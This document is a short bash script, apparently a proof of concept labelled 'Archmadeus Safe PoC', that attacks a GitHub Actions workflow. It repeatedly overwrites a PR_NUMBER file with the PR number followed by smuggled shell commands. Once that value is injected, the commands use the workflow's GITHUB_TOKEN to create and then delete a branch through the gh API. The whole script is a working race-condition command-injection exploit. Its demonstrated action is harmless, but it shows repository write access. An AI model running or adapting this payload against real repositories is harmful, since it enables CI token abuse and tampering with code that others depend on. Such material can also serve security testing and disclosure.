#!/usr/bin/env bash
set -u

write_payload() {
  pr="$1"

  payload="${pr}; base_branch=\$(gh api repos/\$GITHUB_REPOSITORY --jq .default_branch); base_sha=\$(gh api repos/\$GITHUB_REPOSITORY/git/ref/heads/\$base_branch --jq .object.sha); branch=\"archmadeus-poc-\${GITHUB_RUN_ID}\"; created_ref=\$(gh api -X POST \"repos/\$GITHUB_REPOSITORY/git/refs\" -f ref=\"refs/heads/\$branch\" -f sha=\"\$base_sha\" --jq '.ref'); gh api -X DELETE \"repos/\$GITHUB_REPOSITORY/git/refs/heads/\$branch\"; echo \"::notice title=Archmadeus Safe PoC::created \${created_ref} then deleted \${branch} using workflow GITHUB_TOKEN\"; exit 42 #"

  printf '%s\n' "$payload" > PR_NUMBER
}

for i in $(seq 1 900); do
  if [ -f PR_NUMBER ]; then
    pr="$(tr -dc '0-9' < PR_NUMBER | head -c 20)"

    if [ -n "$pr" ]; then
      for j in $(seq 1 100); do
        write_payload "$pr"
        sleep 0.05
      done
      exit 0
    fi
  fi

  sleep 0.1
done

exit 0
